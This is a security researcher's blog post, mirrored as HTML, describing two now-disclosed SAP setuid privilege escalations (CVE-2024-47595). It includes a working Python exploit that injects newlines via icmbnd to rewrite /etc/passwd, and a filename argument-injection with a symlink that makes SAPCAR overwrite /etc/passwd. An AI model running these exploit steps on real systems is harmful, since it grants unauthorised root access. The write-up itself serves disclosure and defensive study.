<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.anvilsecure.com/blog/one-bug-wasnt-enough-escalating-twice-through-saps-setuid-landscape.html">Original</a>
    <h1>One Bug Wasn&#39;t Enough: Escalating Twice Through SAP&#39;s Setuid Landscape</h1>
    
    <div id="readability-page-1" class="page"><div id="pg-6392-0"><div id="pgc-6392-0-0"><div id="panel-6392-0-0-0" data-index="0"><div>
<div>
	<p><strong>By Tao Sauvage</strong></p>
<h4>SAP setuid</h4>
<p>It&#39;s not every day you get a chance to one-up your CTO and co-founder of the company you work for. In 2020, <a href="https://www.anvilsecure.com/blog/tale_in_two_parts.html">Vincent Berg published a blog post</a> describing a vulnerability he found affecting an SAP <code data-enlighter-language="raw">setuid</code> binary while preparing for a client project. Combined with an insecure NFS configuration, he was able to compromise a dozen UNIX machines during that client engagement.</p>
<p>Last year, I was assigned to a new SAP-related project for the same client. I made it a personal goal to find two 0-day vulnerabilities (one more than Vincent) in the SAP software used by the client. It was a success, with <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47595" target="_blank" rel="noopener">CVE-2024-47595</a> assigned by SAP for both issues! Along the way, I learned about SAP internals, SAR archives, and even wrote a utility tool that I&#39;m releasing today: <a href="https://github.com/anvilsecure/SAPCARve/tree/main" target="_blank" rel="noopener">SAPCARve</a>.</p>
<p>The vulnerabilities I found were also local privilege escalations from <code data-enlighter-language="raw">sapsys</code> to <code data-enlighter-language="raw">root</code> affecting <code data-enlighter-language="raw">setuid</code> binaries. Considering that <code data-enlighter-language="raw">sapsys</code> is already a privileged SAP user, the impact was rightfully rated as Medium by SAP (CVSS v3.1 score of 6.3).</p>
<p>Let&#39;s go through this step by step, from initial recon to root shell, and see how the vulnerabilities unfolded.</p>

<h4>Reconnaissance</h4>
<p>Following Vincent&#39;s trodden path, I enumerated all <code data-enlighter-language="raw">setuid</code> binaries that my user could access on the client&#39;s server. A <code data-enlighter-language="raw">setuid</code> binary on Linux runs with the privileges of its file owner (in this case, root) rather than the current user, making them attractive targets for privilege escalation.</p>
<p>The enumeration revealed four potential targets (after removing the duplicates):</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">-rwsr-x---. 1 root sapsys 4.0M May 9 04:52 /usr/sap/hostctrl/exe/hostexecstart
-rwsr-x---. 1 root sapsys 3.7M May 9 04:52 /usr/sap/hostctrl/exe/sapuxuserchk
-rwsr-x--- 1 root sapsys 2.4M May 7 2023 /usr/sap/ABC/D00/exe/sapuxuserchk
-rwsr-x--- 1 root sapsys 3.1M Jun 21 13:16 /usr/sap/ABC/D00/exe/icmbnd
-rwsr-x--- 1 root sapsys 2.7M Jun 11 2020 /usr/sap/DEF/SYS/exe/uc/linuxx86_64/icmbnd
-r-sr-x--- 1 root sapsys 63M Dec 18 2023 /usr/sap/ABC/D00/exe/mdc/hdbmdcdispatcher</pre>
<p>Considering the limited time window for the project, I quickly excluded the following binaries:</p>
<ul>
<li>
<code data-enlighter-language="raw">hdbmdcdispatcher</code> as it was exploited by Vincent in his blog post</li>
<li>
<code data-enlighter-language="raw">sapuxuserchk</code> as it was already covered by <a href="https://github.com/advisories/GHSA-3367-hvxp-fpp7" target="_blank" rel="noopener">CVE-2022-29614</a>
</li>
</ul>
<p>That left <code data-enlighter-language="raw">icmbnd</code> and <code data-enlighter-language="raw">hostexecstart</code>, neither of which had any known CVEs or public exploits.</p>
<p>I downloaded the <a href="https://www.sap.com/products/data-cloud/hana/express-trial.html" target="_blank" rel="noopener">SAP HANA Express VM</a> and configured a local environment where I could more easily analyze and debug the binaries, without risking damage to the client&#39;s infrastructure. I manually copied <code data-enlighter-language="raw">icmbnd</code> to the VM as it was not included by default, and reconfigured its UNIX permissions to restore the setuid bit. Fortunately, it ran out of the box with no glibc version mismatch or other issues.</p>
<p>Note that the default <code data-enlighter-language="raw">hxeadm</code> user can already execute any commands using <code data-enlighter-language="raw">sudo</code> without a password on the VM:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">hxeadm:hxeadm&gt; sudo -l
[ snip ]
User hxeadm may run the following commands on hxehost:
(ALL) NOPASSWD: ALL
(ALL) NOPASSWD: ALL</pre>
<p>However, this was not the case on the client&#39;s server so for our purposes, we&#39;ll ignore this and assume that the user cannot run commands using <code data-enlighter-language="raw">sudo</code>.</p>

<h4>Target 1: icmbnd</h4>
<p>Looking at the usage message from <code data-enlighter-language="raw">icmbnd</code>, we could specify the name of the trace file:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="14">hxehost:hxeadm&gt; /usr/sap/ABC/D00/exe/icmbnd -h
Usage: icmbnd &lt;options&gt;
with the following options:
-v[ersion] display version info and exit
-S &lt;ServerPort&gt; listen port of the controlling program (eg. icman)
-H &lt;hostname&gt; hostname to bind port to (default: all names)
-l &lt;port for listen&gt; servicename or portnumber
-p &lt;protocol&gt; protocol to use (HTTP, HTTPS, SMTP)
-i &lt;virt host idx&gt; index of the virtual host(default: -1)
-k &lt;keep_alive_timeout&gt; keep alive timeout for this port
-K &lt;proc_timeout&gt; Processing timeout for this port
-c verify_client &lt;val&gt; SSL client verification option (0,1,2)
-t &lt;trace_level&gt; tracelevel (default:1)
-f &lt;trace_file&gt;] name of the tracefile (default: dev_icmbnd)
-apptrc append to existing tracefile</pre>
<p>Considering that <code data-enlighter-language="raw">icmbnd</code> runs with the privileges of root, it could be possible to have the trace file point to a protected file and overwrite it. A quick check confirms our hypothesis:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="1,5">hxehost:hxeadm&gt; /usr/sap/ABC/D00/exe/icmbnd -S 6668 -l 6669 -p HTTP -f /etc/passwd
IcmBndConnect: IcmConnect to port 6668 failed (rc=-10)
icmbnd: IcmBndConnect (rc=-10)
hxehost:hxeadm&gt; ls -alh /etc/passwd
-rw-r--r-- 1 root sapsys 1.2K June 17 16:58 /etc/passwd</pre>
<p>The file <code data-enlighter-language="raw">/etc/passwd</code> was overridden with the trace message generated by the binary. Looking at ways to exploit it (aside from the obvious Denial-of-Service), I considered injecting a new line into <code data-enlighter-language="raw">/etc/passwd</code> for a new user with root privileges.</p>
<p>While chatting with Vincent, he mentioned that the parsing of <code data-enlighter-language="raw">/etc/passwd</code> is fairly robust in the sense that it will ignore invalid entries. As long as the output of <code data-enlighter-language="raw">icmbnd</code> contains a valid entry, I could inject a new user. I chose to reuse my user and change its group ID to 0, therefore assigning it to the root group ID.</p>
<p>Now the question remains: how to inject a new line? Using <a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank" rel="noopener">Ghidra</a>, I checked how <code data-enlighter-language="raw">icmbnd</code> was validating the parameters and didn&#39;t see much, if any, validation. For instance, the <code data-enlighter-language="raw">-l</code> option supports both port numbers and service names.</p>
<p>A quick dynamic check confirms that I can insert a new line in the service name, which is reflected in the trace file. Just what I need.</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="8,14">hxehost:hxeadm&gt; cat run.py
import os

bin2run = &#39;/usr/sap/HXE/HDB90/SYS/exe/uc/linuxx86_64/icmbnd&#39;

# Patching GID for hxeadm in /etc/passwd
passwd = open(&#39;/etc/passwd&#39;, &#39;r&#39;).read()
patched_passwd = passwd.replace(&#39;hxeadm:x:1001:79&#39;, &#39;hxeadm:x:1001:0&#39;)

os.execvp(
    bin2run, [
        bin2run,
        &#39;-S&#39;, &#39;6668&#39;,
        &#39;-l&#39;, f&#39;6669\n{patched_passwd}\n&#39;,
        &#39;-p&#39;, &#39;HTTP&#39;,
        &#39;-f&#39;, &#39;/etc/passwd&#39;
    ])
hxehost:hxeadm&gt; python3 run.py
icmbnd: NiListen failed for 6669
[ snip ]
wwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/false
hxeadm:x:1001:0:SAP HANA Database System Administrator:/usr/sap/HXE/home:/bin/bash
sapadm:x:488:79:SAP Local Administrator:/home/sapadm:/bin/false

(rc=-8): NIEINVAL
IcmBndConnect: IcmConnect to port 6668 failed (rc=-10)
icmbnd: IcmBndConnect (rc=-10)</pre>
<p>Checking the content of the <code data-enlighter-language="raw">/etc/passwd</code> file, we can see our injected entry with <code data-enlighter-language="raw">hxeadm</code> assigned GID 0:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="13">hxehost:hxeadm&gt; cat /etc/passwd

---------------------------------------------------
trc file: &#34;passwd&#34;, trc level: 1, release: &#34;753&#34;
---------------------------------------------------

[ snip ]
[Thr 139669455066944]
[Thr 139669455066944] *** WARNING =&gt; NiServerHandle: parameter invalid (strlenU(pServName) &gt;= NI_MAX_SERVNAME_LEN) [nixx.c 263]
[Thr 139669455066944] *** ERROR =&gt; icmbnd: NiListen failed for 6669
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
[ snip ]
hxeadm:x:1001:0:SAP HANA Database System Administrator:/usr/sap/HXE/home:/bin/bash
sapadm:x:488:79:SAP Local Administrator:/home/sapadm:/bin/false

(rc=-8): NIEINVAL [icxxbnd.c 620]
[ snip ]</pre>
<p>By starting a new session with SSH for example, we confirm our new privileges:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">hxeadm@hxehost:/usr/sap/HXE/HDB90&gt; id
uid=1001(hxeadm) gid=0(root) groups=0(root),16(dialout),33(video),1000(hxeshm)</pre>

<h4>Target 2: hostexecstart</h4>
<p>The first target was a quick win. Then I checked <code data-enlighter-language="raw">hostexecstart</code>, which proved trickier to exploit.</p>
<p>Looking at the usage message for <code data-enlighter-language="raw">hostexecstart</code>, the target only supports a limited number of parameters. And only one that accepts a value we can control:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="7">hxehost:hxeadm&gt; /usr/sap/hostctrl/exe/hostexecstart -h
usage: hostexecstart [option]
option:
-start: start the SAPHostAgent if not running.
-restart: stop SAPHostAgent if running, and restart it.
-status: return the status of SAPHostAgent (running/stopped)
-upgrade &lt;archive&gt;: upgrade SAPHostAgent using the SAR archive &lt;archive&gt;</pre>
<p>The <code data-enlighter-language="raw">start</code>, <code data-enlighter-language="raw">restart</code>, and <code data-enlighter-language="raw">status</code> options might be vulnerable to race conditions, for example. Still, I thought that the <code data-enlighter-language="raw">upgrade</code> option was more interesting because it accepts an archive path we can control.</p>
<p>I thought: why not just create a SAR archive that contains a backdoor and feed it to <code data-enlighter-language="raw">hostexecstart</code>? There is just one minor (well, major) hurdle: the SAR archive is signed and its signature is verified before extracting any file.</p>
<p>Before I go into more details about what SAR archives are and how they are signed, let&#39;s see how the archive path is used by <code data-enlighter-language="raw">hostexecstart</code>.</p>
<p>The archive path is first passed to another binary named <code data-enlighter-language="raw">saphostexec</code>, which builds the following command:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">/usr/sap/hostctrl/exe/saphostexec -upgrade -archive &lt;archive&gt; -verify</pre>
<p>I checked whether it was possible to control where <code data-enlighter-language="raw">saphostexec</code> was loaded from but it was a dead end. <code data-enlighter-language="raw">hostexecstart</code> relies on <code data-enlighter-language="raw">argv[0]</code> to retrieve the current directory. We could fake that with a wrapper script that changes the value of <code data-enlighter-language="raw">argv[0]</code> and point to an arbitrary location. However, <code data-enlighter-language="raw">hostexecstart</code> then checks that the binary and its directory are owned by <code data-enlighter-language="raw">root</code>, which I couldn&#39;t bypass.</p>
<p><code data-enlighter-language="raw">saphostexec</code> then builds one final command to call the <code data-enlighter-language="raw">SAPCAR</code> binary:</p>
<pre data-enlighter-language="shell" data-enlighter-linenumbers="false" data-enlighter-theme="classic">/usr/sap/hostctrl/exe/SAPCAR -manifest &#34;/usr/sap/hostctrl/work/archive/SIGNATURE.SMF&#34; -V -xfvs &lt;archive&gt; -R &#34;/usr/sap/hostctrl/work/archive&#34;</pre>
<p>Bear in mind that the commands are not executed in a shell environment so it&#39;s not possible to chain bash commands (e.g. using <code data-enlighter-language="raw">&amp;&amp; id</code>) or use command substitutions (e.g. using <code data-enlighter-language="raw">$(id)</code>).</p>
<p>Let&#39;s break down the final command:</p>
<ul>
<li>
<code data-enlighter-language="raw">R</code>: Use the <code data-enlighter-language="raw">/usr/sap/hostctrl/work/archive</code> directory as the working directory (e.g., where to extract the files), rather than the current directory</li>
<li>
<code data-enlighter-language="raw">V</code>: Enable signature validation</li>
<li>
<code data-enlighter-language="raw">x</code>: Perform the extract operation</li>
<li>
<code data-enlighter-language="raw">v</code>: Be verbose</li>
<li>
<code data-enlighter-language="raw">s</code>: Check if there is enough free space for the extraction to succeed</li>
<li>
<code data-enlighter-language="raw">manifest</code>: Check the signature of the manifest specified in the path</li>
</ul>
<p>The only check performed on the <code data-enlighter-language="raw">archive</code> path is that the file exists. No other validation. So it is possible to inject parameters that will be processed by <code data-enlighter-language="raw">SAPCAR</code>. The only restriction is that it cannot contain any forward slashes (the only character forbidden in UNIX file names).</p>
<p>Going back to the usage message, one parameter stood out:</p>
<pre data-enlighter-language="raw" data-enlighter-linenumbers="false">-L FILE       : use security library FILE for signature operations
                (default: libsapcrypto.so)</pre>
<p>With <code data-enlighter-language="raw">-L</code> we can load our own library and bypass the signature validation. Exactly what we&#39;re looking for. Unfortunately, this was another dead end.</p>
<p>When specifying <code data-enlighter-language="raw">-L</code>, <code data-enlighter-language="raw">SAPCAR</code> uses <code data-enlighter-language="raw">dlopen</code> to load the library. Remember, we can&#39;t have any slashes in our injected parameters so at best, we can inject <code data-enlighter-language="raw">-L libdummy.so</code> (but not <code data-enlighter-language="raw">-L ./libdummy.so</code>). <code data-enlighter-language="raw">SAPCAR</code> looks in standard system directories like <code data-enlighter-language="raw">/lib64/</code> and <code data-enlighter-language="raw">/usr/lib64/</code>, but not in our current directory. We can&#39;t plant it in <code data-enlighter-language="raw">SAPCAR</code>&#39;s directory because it is owned by root and we can&#39;t use the <code data-enlighter-language="raw">LD_LIBRARY_PATH</code> environment variable because <code data-enlighter-language="raw">setuid</code> binaries ignore it. So close and yet so far...</p>
<p>I thought, OK, how hard can it be to sign my own SAR archive? Well, even to this day I&#39;ve been unable to sign my own. If anyone has figured it out, I&#39;d love to hear about it! Below is my attempt.</p>
<h4>Signing SAR archives</h4>
<p>Let&#39;s go down the rabbit hole together and learn more about SAR. The SAR format is a proprietary archive file format developed by SAP. The <code data-enlighter-language="raw">SAPCAR</code> utility tool can be used to create and extract SAR archives.</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">$ SAPCAR -tvf test.sar
SAPCAR: processing archive test.sar (version 2.01)
-rwxrwxrwx           5    27 Mar 2025 15:19 test.txt
-rwxrwxrwx           9    27 Mar 2025 15:21 test2.txt</pre>
<p>The file format has a fairly simple structure of blocks, each containing a compressed chunk of data, which was previously reversed and documented by others. Each file contains metadata such as the file name, its permissions, and its timestamp, among others. There is a tool in <a href="https://github.com/OWASP/pysap/blob/d930e400f1949577c6bfb494cd8525f27ef4f32d/pysap/SAPCAR.py" target="_blank" rel="noopener">the OWASP pysap project</a> to create and parse SAR files.</p>
<p><code data-enlighter-language="raw">SAPCAR</code> also allows for signing SAR archives. I did not find much public documentation on that topic. From what I gathered using Ghidra and GDB, the signature is implemented as follows:</p>
<ul>
<li>A manifest file is created that contains metadata and a list of digests / filenames (e.g. the SHA256 hash for the file &#39;test.txt&#39; in the archive)</li>
<li>The manifest is then signed using <code data-enlighter-language="raw">PKCS7-TSTAMP</code> and SAP&#39;s CommonCrypto library, which generates a signature using the PKCS #7 standard with a trusted timestamp from a Time Stamp Authority (TSA) (see: <a href="https://www.ietf.org/rfc/rfc3161.txt" target="_blank" rel="noopener">RFC 3161</a>)</li>
</ul>
<p>Below is an example of such a manifest from an official, signed SAR archive provided by SAP:</p>
<pre data-enlighter-language="raw" data-enlighter-linenumbers="false">SAP-MANIFEST
Version: 1.0
Hash: SHA256
Signature: PKCS7-TSTAMP
Body: Digest | Name-Length | Name
 
c6e9fb02ab59e7580fcaea6c37ae6ae6f6f5151d4ca8843659a649670fa2f6ee 000a patches.mf
a19098e76e675b2bd1269fa6e44042d71a411019dd3ac56a3487c65408a39ee5 0002 tp
 
-----BEGIN SIGNATURE-----
[ snip ]
-----END SIGNATURE-----</pre>
<p>When reading the usage message from <code data-enlighter-language="raw">SAPCAR</code>, it lists the following command to sign a SAR file, which is exactly what we&#39;re looking for:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">sign an existing archive:
SAPCAR -Svf MY.SAR [-L library] [-key PSE] [-pwd PSE PIN] [-H algorithm]</pre>
<p>I generated a dummy PSE using <code data-enlighter-language="raw">sapgenpse</code>. However, the <code data-enlighter-language="raw">SAPCAR</code> command resulted in the following error:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">SAPCAR: No timestamp authority set</pre>
<p>Using Ghidra, I found a <code data-enlighter-language="raw">-tsaurl</code> parameter that is not listed in the usage message. However, once again, it failed:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">$ SAPCAR -key test.pse -tsaurl http://freetsa.org/tsr -Svf test.sar
SAPCAR: error in signature verification (error 60). SSF-RC: SSF_API_OK
Detail: SsfErrorName(5) == &#34;SSF_API_SIGNER_ERRORS&#34;, SsfErrorDescription(5) == &#34;A signing operation could not be performed or failed&#34;, Last error from SAPCRYPTOLIB: &#34;A signing operation could not be performed or failed&#34; &lt;-- SsfLibAddTimeStampResp() == 5</pre>
<p>The error message was not clear to me. Setting the <code data-enlighter-language="raw">SAPMANIFEST_TRACELEVEL=3</code> environment variable, <code data-enlighter-language="raw">SAPCAR</code> will generate a trace stored in <code data-enlighter-language="raw">dev_sapmanifest.trc</code>:</p>
<pre data-enlighter-language="raw" data-enlighter-linenumbers="false">[ snip ]
CCL[VERIFY]: Certificate verification result (failed)
----- BEGIN VERIFICATION RESULT -----
 # --- Messages -----------
 INFO: Verification time - Fri Mar 28 15:04:42 2025                                 ERROR: The verified certificate chain is complete but no certificate is trusted.
[ snip ]</pre>
<p>Despite adding the CAs to my PSE to be trusted, it still failed. I came to understand that only a CA trusted by SAP can be used to sign SAR archives. And I could not find any publicly accessible information related to SAP&#39;s TSA service and how to use it. It might be a service that only SAP is allowed to use for all I know.</p>
<h4>Manipulating SAR archives</h4>
<p>At this point, I decided to find other ways to abuse the argument injection. If I could not sign my own SAR archive, maybe I could tamper with a legitimate one?</p>
<p>The <code data-enlighter-language="raw">pysap</code> project only supports Python2 and the tool for SAR archive was too limited for my tests. So<span data-olk-copy-source="MessageBody">, as mentioned and linked in the introduction,</span> I wrote my own tool for parsing and manipulating SAR archives: <code data-enlighter-language="raw">SAPCARve</code></p>
<ul>
<li>I wrote a <a href="https://kaitai.io/" target="_blank" rel="noopener">Kaitai Structure</a> for SAR files and used their <a href="https://doc.kaitai.io/serialization.html" target="_blank" rel="noopener">serialization guide</a> to store the modified SAR files back on the disk.</li>
<li>It also reuses the <code data-enlighter-language="raw">pysapcompress</code> Python binding for SAP&#39;s compression/decompression library that I (or more precisely Claude 3.7) ported to Python 3.</li>
</ul>
<p><code data-enlighter-language="raw">SAPCARve</code> provides some handy commands to manipulate SAR archives:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">$ python3 SAPCARve.py -h
usage: SAPCARve.py [-h] sar {list,extract,add,delete,swap,rename,chmod,merge} ...

SAPCAR manipulation tool

positional arguments:
  sar                   Path to the .sar (or .car) archive
    {list,extract,add,delete,swap,rename,chmod,merge}
    list                List content of the archive
    extract             Extract a file from the archive
    add                 Add a file/symlink/directory to the archive (file, sym, dir respectively)
    delete              Delete a block inside the archive
    swap                Swap two blocks inside the archive
    rename              Rename a file inside the archive
    chmod               Change the permission of a file inside the archive
    merge               Merge two SAR archives by appending blocks from one to the other

options:
  -h, --help            show this help message and exit</pre>
<p>I performed several tests against a legitimate SAR archive signed by SAP:</p>
<ul>
<li>Delete the <code data-enlighter-language="raw">SIGNATURE.SMF</code> manifest</li>
<li>Extract the <code data-enlighter-language="raw">SIGNATURE.SMF</code> manifest and try to change the SHA256 it contained or remove its signature</li>
<li>Append a new file before or after the <code data-enlighter-language="raw">SIGNATURE.SMF</code> blocks</li>
<li>Append a file with the same name as a file already in the archive, before and after the original file</li>
</ul>
<p>Each of these caused the signature validation to fail. For instance, when appending a new file to the signed archive, <code data-enlighter-language="raw">SAPCAR</code> returned the following error:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="8">$ SAPCAR -V -xvf test.sar
SAPCAR: processing archive test.sar (version 2.01)
x patches.mf
x test
x tp
SAPCAR: error during certificate revocation check (error 61). SSF-RC: SSF_API_OK
Detail: CRL missing. Download and use CRL from https://tcs.mysap.com/crl/crlbag.p7s
File &gt;test&lt; was not found in manifest</pre>
<p>Seeing the file name &#39;test&#39; reflected in the response, you may have déjà vu from <code data-enlighter-language="raw">icmbnd</code>. And indeed, a quick test confirmed that file names can contain any character, including new lines.</p>
<p>To exploit this, we can use the <code data-enlighter-language="raw">-e</code> option to redirect the output to <code data-enlighter-language="raw">sapcar_output</code>. We also create a symbolic link from <code data-enlighter-language="raw">sapcar_output</code> to our target file <code data-enlighter-language="raw">/etc/passwd</code> and inject our modified content:</p>
<pre data-enlighter-language="raw" data-enlighter-linenumbers="false">-e            : redirect output from stdout to file sapcar_output</pre>
<p>To prepare the malicious SAR file, I used <code data-enlighter-language="raw">SAPCARve</code> to rename a file inside the legitimate SAR archive with the content of the <code data-enlighter-language="raw">/etc/passwd</code> file, patched to set my GID to 0:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">$ python3 SAPCARve.py test.sar rename 0 &#34;aaaa
&gt; $(cat passwd_patched)
&gt; # bbbb&#34;
SAR archive version: 2.01
Number of files: 3
        0: -rwxrwxr-x 300       aaaa
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
[ snip]
hxeadm:x:1001:0:SAP HANA Database System Administrator:/usr/sap/HXE/home:/bin/bash
sapadm:x:488:79:SAP Local Administrator:/home/sapadm:/bin/false
# bbbb
        1: -rwxrwxr-x 10575444  tp
        2: drw------- 4922      SIGNATURE.SMF</pre>
<p>On the server, we place our malicious <code data-enlighter-language="raw">newline.sar</code> archive in a directory, create the symbolic link and create a file containing our injected options (remember that <code data-enlighter-language="raw">hostexecstart</code> checks if the file exists):</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">hxehost:hxeadm&gt; ln -s /etc/passwd ./sapcar_output
# This filename injects -e as parameter into SAPCAR to enable file overwrite.
# The -y option is used to consume the remaining options appended by `saphostexec`
hxehost:hxeadm&gt; touch &#39;newline.sar&#34; -e -y &#39;</pre>
<p>Finally, we call <code data-enlighter-language="raw">hostexecstart</code> to trigger the exploit:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">hxehost:hxeadm&gt; /usr/sap/hostctrl/exe/hostexecstart -upgrade &#39;newline.sar&#34; -e -y &#39;
Executing: /usr/sap/hostctrl/exe/saphostexec -upgrade -archive newline.sar&#34; -e -y  -verify  in /hana/shared/HXE/HDB90
Upgrade service
Files authenticity will be verified
Extracting archive
ExtractHostagentSAR: Executing: &#34;/usr/sap/hostctrl/exe/SAPCAR&#34; -manifest &#34;/usr/sap/hostctrl/work/archive/SIGNATURE.SMF&#34; -V -xfvs &#34;/hana/shared/HXE/HDB90/newline.sar&#34; -e -y ,&#34; -R &#34;/usr/sap/hostctrl/work/archive&#34;
[WARNING] ExtractHostagentSAR exit with status 61
[OK] ExtractHostagentSAR: Archive directory &#39;/usr/sap/hostctrl/work/archive&#39; added to delete list.
[ERROR] Extract Archive failed.</pre>
<p>As expected, the extraction failed but the content of <code data-enlighter-language="raw">/etc/passwd</code> now includes the output of <code data-enlighter-language="raw">SAPCAR</code>:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false" data-enlighter-highlight="8">hxehost:hxeadm&gt; cat /etc/passwd
SAPCAR: processing archive /hana/shared/HXE/HDB90/newline.sar (version 2.01)
SAPCAR: error during certificate revocation check (error 61). SSF-RC: SSF_API_OK
Detail: CRL missing. Download and use CRL from https://tcs.mysap.com/crl/crlbag.p7s
File &gt;aaaa
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
[ snip ]
hxeadm:x:1001:0:SAP HANA Database System Administrator:/usr/sap/HXE/home:/bin/bash
sapadm:x:488:79:SAP Local Administrator:/home/sapadm:/bin/false
# bbbb&lt; was not found in manifest</pre>
<p>We can confirm once again our new privileges by starting a new session:</p>
<pre data-enlighter-language="shell" data-enlighter-theme="classic" data-enlighter-linenumbers="false">hxeadm@hxehost:/usr/sap/HXE/HDB90&gt; id
uid=1001(hxeadm) gid=0(root) groups=0(root),16(dialout),33(video),1000(hxeshm)</pre>
<h4>Conclusion</h4>
<p>It was an interesting challenge to try and one-up my CTO and co-founder of Anvil Secure during the client&#39;s project. In addition to covering the original scope, I was able to dig into the SAP software and discovered and exploited two 0-day vulnerabilities to gain root access.</p>
<p>With our client&#39;s approval, we initiated a coordinated vulnerability disclosure process on their behalf with SAP. A couple of months later, SAP confirmed that a patch was available for their customers and assigned <code data-enlighter-language="raw">CVE-2024-47595</code> for both issues.</p>
<p>This kind of work (digging deep, getting lost in rabbit holes, solving puzzles, and building tools) is my favorite part of being a security engineer. It&#39;s where creative thinking shines.</p>
<p>I like it so much that, when preparing this blog post, I decided to redo a couple of tests to tie up loose ends. And then more tests... And oh, what is that? That looks interesting. Let&#39;s dive into this new rabbit hole. And that one. And I have now started yet another coordinated vulnerability disclosure process with SAP with a new batch of vulnerabilities. So... to be continued?</p>
</div>
</div></div></div></div></div>
  </body>
</html>
